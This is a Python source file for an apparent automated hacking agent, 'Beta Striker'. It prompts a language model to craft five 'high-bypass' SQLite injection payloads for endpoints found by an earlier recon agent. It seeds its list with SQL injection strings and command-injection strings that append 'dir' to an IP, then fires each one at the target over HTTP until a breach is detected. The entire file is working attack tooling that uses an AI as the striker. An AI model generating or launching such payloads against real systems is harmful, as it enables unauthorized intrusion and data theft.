from .llm_client import call_groq
from tools.http_exploit import fire_payload
from tracing import trace
import json

@trace(name="Beta Striker")
async def run_beta(target_url, vuln_type, alpha_data, journal, broadcast_fn, trace_context=None) -> dict:
    from tracing import trace_step
    
    context = journal.get_context_string()
    recon_data = "\n".join(alpha_data['results'])
    endpoints_str = json.dumps(alpha_data.get('endpoints', []), indent=2)
    
    prompt = f"""You are Beta, the Striker agent.
TARGET ENDPOINT CONTEXT:
- Database: SQLite
- Vulnerability Target: {vuln_type}

DISCOVERED ATTACK SURFACE (From Alpha):
{endpoints_str}

ATTACK JOURNAL (everything tried so far — do NOT repeat any of these):
{context}

RECON INTELLIGENCE:
{recon_data[:2000]}

Your task:
1. Identify the correct endpoint path and input field for this {vuln_type} from the Discovered Attack Surface.
2. Generate an array of 5 diverse, high-bypass SQLite payloads to try. Use string-based bypasses.
3. Output ONLY a JSON object with these exactly 3 keys:
   - "endpoint_path": e.g., "/api/v1/search" or "/login"
   - "input_field": e.g., "search_term" or "username"
   - "payloads": array of 5 strings"""

    messages = [{"role": "system", "content": prompt}]
    
    # Identify fallback from Alpha Recon
    default_path = alpha_data.get("endpoints", [{"path": "/login"}])[0]["path"]
    default_field = "username" # Default heuristic
    if alpha_data.get("endpoints"):
        e = alpha_data["endpoints"][0]
        if e.get("inputs"):
            default_field = e["inputs"][0]

    await broadcast_fn("Designing a SHOTGUN BATCH of 5 diverse payloads...", "Beta", "thinking")
    
    # Seed with guaranteed proven payloads that work on SQLite string concatenation
    if vuln_type == "sqli":
        seed_payloads = ["' OR 1=1 --", "' OR '1'='1' --", "1' OR '1'='1' --"]
    else:
        seed_payloads = ["127.0.0.1; dir", "127.0.0.1 & dir", "127.0.0.1 | dir"]

    try:
        raw_response = await call_groq(messages, json_mode=True)
        data = json.loads(raw_response)
        ai_payloads = data.get("payloads", [])
        endpoint_path = data.get("endpoint_path", default_path)
        input_field = data.get("input_field", default_field)
    except Exception:
        ai_payloads = []
        endpoint_path = default_path
        input_field = default_field

    # Merge: proven seeds first, then unique AI-generated extras
    seen = set(seed_payloads)
    extra = [p for p in ai_payloads if p not in seen]
    payloads = seed_payloads + extra[:2]  # Total up to 5
        
    last_response = None
    last_payload = None
    
    for payload in payloads:
        # ONLY strip whitespace. Do NOT strip quotes or apostrophes, as they are essential for SQLi breakouts.
        payload = payload.strip()
        await broadcast_fn(f"Firing payload → {payload} at {endpoint_path} ({input_field})", "Beta", "info")
        
        if trace_context:
            span_id = trace_step(trace_context["workflow_id"], "HTTP_EXPLOIT", trace_context["parent_id"], {"payload": payload}, "running")
            response = await fire_payload(target_url, vuln_type, payload, endpoint_path, input_field, {"workflow_id": trace_context["workflow_id"], "parent_id": span_id})
            trace_step(trace_context["workflow_id"], "HTTP_EXPLOIT", trace_context["parent_id"], {"status_code": response["status_code"]}, "success")
        else:
            response = await fire_payload(target_url, vuln_type, payload, endpoint_path, input_field)
        
        last_response = response
        last_payload = payload
        
        if response["is_breach"]:
            await broadcast_fn(f"Target BREACHED with payload: {payload}", "Beta", "info")
            break
            
    return {"payload": last_payload, "response": last_response, "endpoint_path": endpoint_path, "input_field": input_field}
